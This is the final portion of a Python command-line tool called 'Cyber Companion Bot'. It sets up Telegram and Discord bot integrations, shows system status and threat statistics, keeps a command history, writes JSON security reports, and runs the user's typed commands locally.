        print(f"\n{Colors.SECONDARY}💬 Discord Bot{Colors.RESET}")
        setup_discord = input(f"{Colors.ACCENT}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup_discord == 'y':
            token = input(f"{Colors.ACCENT}Enter bot token: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ACCENT}Enter command prefix (default: !): {Colors.RESET}").strip() or "!"
            self.discord_bot.save_config(token, prefix, True)
            print(f"{Colors.SUCCESS}✅ Discord configured!{Colors.RESET}")
        
        # Start bots
        print(f"\n{Colors.SECONDARY}🚀 Starting bots...{Colors.RESET}")
        if self.telegram_bot.config.get('enabled'):
            self.telegram_bot.start_bot_thread()
            print(f"{Colors.SUCCESS}✅ Telegram bot started{Colors.RESET}")
        
        if self.discord_bot.config.get('enabled'):
            self.discord_bot.start_bot_thread()
            print(f"{Colors.SUCCESS}✅ Discord bot started{Colors.RESET}")
    
    def print_status(self):
        """Print system status"""
        stats = self.db.get_statistics()
        status = self.executor.execute("system", "local")
        
        print(f"\n{Colors.PRIMARY}📊 System Status{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        print(f"\n{Colors.SECONDARY}💻 System Information:{Colors.RESET}")
        print(f"  OS: {platform.system()} {platform.release()}")
        print(f"  Hostname: {socket.gethostname()}")
        print(f"  CPU: {psutil.cpu_percent()}%")
        print(f"  Memory: {psutil.virtual_memory().percent}%")
        print(f"  Disk: {psutil.disk_usage('/').percent}%")
        
        print(f"\n{Colors.SECONDARY}📊 Database Statistics:{Colors.RESET}")
        print(f"  Total Commands: {stats.get('total_commands', 0)}")
        print(f"  Total Scans: {stats.get('total_scans', 0)}")
        print(f"  Total Threats: {stats.get('total_threats', 0)}")
        
        print(f"\n{Colors.SECONDARY}🤖 Bot Status:{Colors.RESET}")
        print(f"  Telegram: {'✅ Active' if self.telegram_bot.running else '❌ Inactive'}")
        print(f"  Discord: {'✅ Active' if self.discord_bot.running else '❌ Inactive'}")
        
        recent_threats = self.db.get_recent_threats(3)
        if recent_threats:
            print(f"\n{Colors.ERROR}🚨 Recent Threats:{Colors.RESET}")
            for threat in recent_threats:
                print(f"  {threat['threat_type']} from {threat['source_ip']} - {threat['severity']}")
    
    def print_history(self, args: List[str]):
        """Print command history"""
        limit = 20
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        
        history = self.db.get_command_history(limit)
        if not history:
            print(f"{Colors.WARNING}📜 No command history{Colors.RESET}")
            return
        
        print(f"\n{Colors.PRIMARY}📜 Command History (Last {len(history)}){Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        for record in history:
            status = f"{Colors.SUCCESS}✅" if record['success'] else f"{Colors.ERROR}❌"
            print(f"{status} [{record['source']}] {record['command'][:80]}{Colors.RESET}")
            print(f"     {record['timestamp'][:19]} - {record['execution_time']:.2f}s")
    
    def print_report(self):
        """Generate and print security report"""
        print(f"\n{Colors.PRIMARY}📊 Generating Security Report...{Colors.RESET}")
        
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(10)
        scans = self.db.get_scan_history(5)
        history = self.db.get_command_history(10)
        
        report = {
            'generated_at': datetime.datetime.now().isoformat(),
            'statistics': stats,
            'recent_threats': threats,
            'recent_scans': scans,
            'command_summary': history
        }
        
        filename = f"security_report_{int(time.time())}.json"
        filepath = os.path.join(REPORT_DIR, filename)
        
        with open(filepath, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n{Colors.SUCCESS}✅ Report generated: {filepath}{Colors.RESET}")
        print(f"\n{Colors.PRIMARY}📊 Report Summary:{Colors.RESET}")
        print(f"  Total Commands: {stats.get('total_commands', 0)}")
        print(f"  Total Scans: {stats.get('total_scans', 0)}")
        print(f"  Total Threats: {stats.get('total_threats', 0)}")
        print(f"  Recent Threats: {len(threats)}")
        print(f"  Recent Scans: {len(scans)}")
    
    def process_command(self, command: str):
        """Process user command"""
        if not command.strip():
            return
        
        parts = command.strip().split()
        cmd = parts[0].lower()
        args = parts[1:]
        
        if cmd == 'help':
            self.print_help()
        
        elif cmd == 'setup':
            self.setup_bots()
        
        elif cmd == 'status':
            self.print_status()
        
        elif cmd == 'history':
            self.print_history(args)
        
        elif cmd == 'report':
            self.print_report()
        
        elif cmd == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
        
        elif cmd == 'exit':
            self.running = False
            print(f"\n{Colors.WARNING}👋 Thank you for using Cyber Companion Bot!{Colors.RESET}")
        
        else:
            # Execute command
            result = self.executor.execute(command, "local")
            
            if result['success']:
                output = result.get('output', '')
                if output:
                    print(output)
                print(f"\n{Colors.SUCCESS}✅ Command executed ({result['execution_time']:.2f}s){Colors.RESET}")
            else:
                print(f"\n{Colors.ERROR}❌ Command failed: {result.get('output', 'Unknown error')}{Colors.RESET}")
    
    def run(self):
        """Main application loop"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        # Ask about bot setup
        setup = input(f"\n{Colors.ACCENT}Setup bot integrations? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            self.setup_bots()
        
        print(f"\n{Colors.SUCCESS}✅ Ready! Type 'help' for commands, 'status' for system info.{Colors.RESET}")
        
        # Main command loop
        while self.running:
            try:
                prompt = f"{Colors.PRIMARY}[{Colors.ACCENT}cyber-companion{Colors.PRIMARY}]{Colors.ACCENT} 🦀> {Colors.RESET}"
                command = input(prompt).strip()
                self.process_command(command)
            
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {str(e)}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        self.db.close()
        print(f"\n{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")
        print(f"{Colors.PRIMARY}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.PRIMARY}💾 Database: {DATABASE_FILE}{Colors.RESET}")
        print(f"{Colors.PRIMARY}📊 Reports: {REPORT_DIR}{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        print(f"{Colors.PRIMARY}🦀 Starting Cyber Companion Bot...{Colors.RESET}")
        
        # Check Python version
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7 or higher is required{Colors.RESET}")
            sys.exit(1)
        
        # Check for required packages
        required_packages = ['psutil']
        missing = []
        
        for package in required_packages:
            try:
                __import__(package)
            except ImportError:
                missing.append(package)
        
        if missing:
            print(f"{Colors.WARNING}⚠️ Missing packages: {', '.join(missing)}{Colors.RESET}")
            print(f"{Colors.WARNING}Install with: pip install {' '.join(missing)}{Colors.RESET}")
        
        # Run application
        app = CyberCompanionBot()
        app.run()
    
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {str(e)}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()